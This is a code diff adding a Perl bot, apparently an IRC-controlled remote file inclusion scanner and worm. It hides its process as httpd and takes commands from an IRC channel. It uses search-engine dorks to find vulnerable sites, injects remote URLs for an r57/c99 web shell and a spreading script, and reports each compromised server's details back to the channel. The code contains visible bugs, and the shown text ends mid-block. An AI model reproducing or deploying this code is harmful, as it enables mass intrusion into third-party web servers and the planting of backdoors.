@@ -1,0 +1,2243 @@
+
+
+$process      = "/usr/sbin/httpd"; ## process
+my $printcmd  = "http://www.evilc0der.com/r57.txt??"; ## r57;c99 shell
+my $id        = "http://www.geocities.com/coreto7/indoirc/bloodid.txt??"; ## ID is private 
+my $spread    = "http://www.geocities.com/coreto7/indoirc/spread.txxt?"; ## spread
+my $ircserver = "darkhc.sytes.net"; ## ur irc server
+my $start     = "!s"; ## command to start scan
+my $port      = "6667"; ## irc server port
+my $nickname  = "[Scan]"; ## nickname
+my $admin     = "r00t1"; ## msg prv
+my $channel   = "#Dark2009"; ## chan
+my $chanres   = "#Dark2009"; ## channel print result
+my $verz      = "r0000x";
+
+print "\n";
+print "RFI Start !!\n";
+print "--PRIV8--\n";
+print "Release $verz\n";
+print "Now join $ircserver:$port\n";
+print "$channel and $chanres\n";
+print "GO GO ;)\n\n";
+
+use IO::Socket::INET;
+use HTTP::Request;
+use LWP::UserAgent;
+require LWP;
+$|++;
+
+my $pid = fork;
+exit if $pid;
+$0 = "$process" . "\0" x 16;
+my $dsp = IO::Socket::INET->new(
+    PeerAddr => "$ircserver",
+    PeerPort => "$port",
+    Proto    => "tcp"
+) or die "Can not connect on server!\n";
+$dsp->autoflush(1);
+print $dsp "NICK $nickname\r\n";
+print $dsp "USER RoSEcan 8 *  : &verz \r\n";
+print $dsp "JOIN $channel\r\n";
+print $dsp "PRIVMSG $channel :3!scan15 bug dork & 1!12G3o13o12g9l3e 15bug dork\r\n";
+sleep(1);
+print $dsp "NICK $nickname\r\n";
+print $dsp "USER priv8 8 *  : $verz \r\n";
+print $dsp "JOIN $chanres\r\n";
+print $dsp "PRIVMSG $chanres :3Results channel ;)\r\n";
+while ( $line = <$dsp> ) {
+
+    $line =~ s/\r\n$//;
+    if ( $line =~ /^PING \:(.*)/ ) {
+        print "PONG :$1";
+        print $dsp "PONG :$1";
+    }
+    if ( $line =~ /PRIVMSG $channel :!help/ ) {
+        sleep(1);
+        display( $dsp,"PRIVMSG $channel :7--------------------------------[3C7ommand]--------------------------------");
+        display( $dsp,"PRIVMSG $channel :7[3C7ommand] To 3S7can Vuln 3S7ites : !3S7kunk ");
+        display( $dsp,"PRIVMSG $channel :7[3C7ommand] 1!12G3o8o12g9l3e 7BUG DORK");
+        display( $dsp,"PRIVMSG $channel :7[3C7ommand] 3S7earch 3E7ngines: !engines ");
+		display( $dsp,"PRIVMSG $channel :7[3C7ommand] 3S7erver 3I7NFO :  !info");
+		display( $dsp,"PRIVMSG $channel :7[3C7ommand] 3V7ersion 3I7NFO : !version");
+		display( $dsp,"PRIVMSG $channel :7[3C7ommand] 3S7canner 3R7esponse Checker : !id");
+        display( $dsp,"PRIVMSG $channel :7--------------------------------[3C7ommand]--------------------------------");
+    }
+    if ($line=~ /PRIVMSG $channel :!version/){ 
+	    display($dsp,"PRIVMSG $channel :7$verz"); 
+		} 
+    if ( $line =~ /PRIVMSG $channel :!info/ ) {
+        my $sysos  = `uname -sr`;
+        my $uptime = `uptime`;
+        if ( $sysos =~ /freebsd/i ) {
+            $sysname = `hostname`;
+            $memory =
+`expr \`cat /var/run/dmesg.boot | grep "real memory" | cut -f5 -d" "\` \/ 1048576`;
+            $swap = `$toploc | grep -i swap | cut -f2 -d" " | cut -f1 -d"M"`;
+            chomp($memory);
+            chomp($swap);
+        }
+
+        elsif ( $sysos =~ /linux/i ) {
+            $sysname = `hostname -f`;
+            $memory  = `free -m |grep -i mem | awk '{print \$2}'`;
+            $swap    = `free -m |grep -i swap | awk '{print \$2}'`;
+            chomp($swap);
+            chomp($memory);
+        }
+        else {
+            $sysname = "No Found";
+            $memory  = "No found";
+            $swap    = "No Found";
+        }
+        $uptime  =~ s/\n//g;
+        $sysname =~ s/\n//g;
+        $sysos   =~ s/\n//g;
+        sleep(1);
+        display( $dsp,"PRIVMSG $channel :7[3I7nfo] G3o...");
+        display( $dsp,"PRIVMSG $channel :7[3I7nfo] IrcServer/Port: $ircserver - $port");
+        display( $dsp,"PRIVMSG $channel :7[3I7nfo] Hostname: $sysos ");
+        display( $dsp,"PRIVMSG $channel :7[3I7nfo] Process/PID: $admin - $$");
+        display( $dsp,"PRIVMSG $channel :7[3I7nfo] Uptime: $uptime" );
+        display( $dsp,"PRIVMSG $channel :7[3I7nfo] Memory/Swap: $memory - $swap");
+        display( $dsp,"PRIVMSG $channel :7[3I7nfo] Admin:16 $admin");     
+		}
+    if ( $line =~ /PRIVMSG $channel :!id/ ) {    ##The Best RFI SCRIPTS Created By --JaheeM--
+        my $testid = $id;
+        my $req    = HTTP::Request->new( GET => $testid );
+        my $ua     = LWP::UserAgent->new();
+        $ua->timeout(5);
+        my $response = $ua->request($req);
+        if ( $response->is_success ) {
+            my $re = $response->content;
+            if ( $re =~ /<\?php/ ) {
+                sleep(1);
+                display( $dsp,"PRIVMSG $channel :3,1Id Work");
+				}
+        }
+        else {
+            sleep(1);
+            display( $dsp,"PRIVMSG $channel :7[3I7nfo] ID Is Dead ..Scan OUT.!!!");
+            display( $dsp,"PRIVMSG $channel :7[3I7nfo] 7Scan OUT 10 secs!!");
+            sleep(10);
+            display( $dsp,"PRIVMSG $channel :7[3I7nfo] Exiting..." );
+            display( $dsp, "QUIT" );
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #google
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                sleep(1);
+                display( $dsp,"PRIVMSG $channel :7,1Ok... Start 1,4 $dork");
+                my @google = &googlet($dork);
+                push( my @tot, @google );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 12G3o3o12g9l3e 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+                my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 12G3o3o12g9l3e 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[12G3o3o12g9l3e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[12G3o3o12g9l3e3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[12G3o3o12g9l3e3] Safe Mode OFF: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[12G3o3o12g9l3e3] Safe Mode ON: $print");
+								my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+								}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+	if ( $line =~ /PRIVMSG $channel :!google\s+(.*?)\s+(.*)/ ) { #googlet
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+     
+                my @google = &googlet($dork);
+                push( my @tot, @google );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3ScaN7] 12G3o3o12g9l3e PASS 12[]8[]3[]  ".scalar(@tot)."3 for exploited.... 3".scalar(@puliti)."3 => 3$dork");
+                my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                        display( $dsp,"PRIVMSG $channel :7[3ScaN7] 12G3o8o12g9l3e PASS FINISHED 7for 3$dork 12[]8[]3[]");						}
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[12G3o3o12g9l3e3 PASS] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[12G3o3o12g9l3e3 PASS] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[12G3o3o12g9l3e3 PASS] Safe Mode OFF: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[12G3o3o12g9l3e3 PASS] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[12G3o3o12g9l3e3 PASS] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #yahoo
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @ylist = yahoo($dork);
+                push( my @tot, @ylist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3Y3a6h7o3o 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3Y3a6h7o3o  3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3Y3a6h7o3o] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3Y3a6h7o3o] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3Y3a6h7o3o] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3Y3a6h7o3o] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3Y3a6h7o3o] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+	if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #alltheweb
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @alltheweb = &alltheweb($dork);
+                push( my @tot, @alltheweb );
+                my @puliti = &unici(@tot);
+                 display( $dsp,"PRIVMSG $channel :7[3$channel7] 12A7l8l3THE12W9e3B 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				 my $uni = scalar(@puliti);
+				
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 12A7l8l3THE12W9e3B 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$pritcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[12A7l8l3THE12W9e3B] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[12A7l8l3THE12W9e3B] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[12A7l8l3THE12W9e3B] Safe Mode OFF: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[12A7l8l3THE12W9e3B] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[12A7l8l3THE12W9e3B] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+								}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #lycos
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @lylist = lycos($dork);
+                push( my @tot, @lylist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3L3y6c7o3s 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3L3y6c7o3s 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3L3y6c7o3s3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3L3y6c7o3s3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3L3y6c7o3s3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3L3y6c7o3s3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3L3y6c7o3s3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #mirago
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @miralist = mirago($dork);
+                push( my @tot, @miralist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3M3i6r7a3g7o 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3M3i6r7a3g7o 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3M3i6r7a3g7o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3M3i6r7a3g7o3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3M3i6r7a3g7o3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3M3i6r7a3g7o3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3M3i6r7a3g7o3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #altavista
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @altavista   = &altavista($dork);
+                push( my @tot, @allist, @alldeist, @allistus );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 7Al13tav3ista 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 7Al13tav3ista 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Uptime: $up");
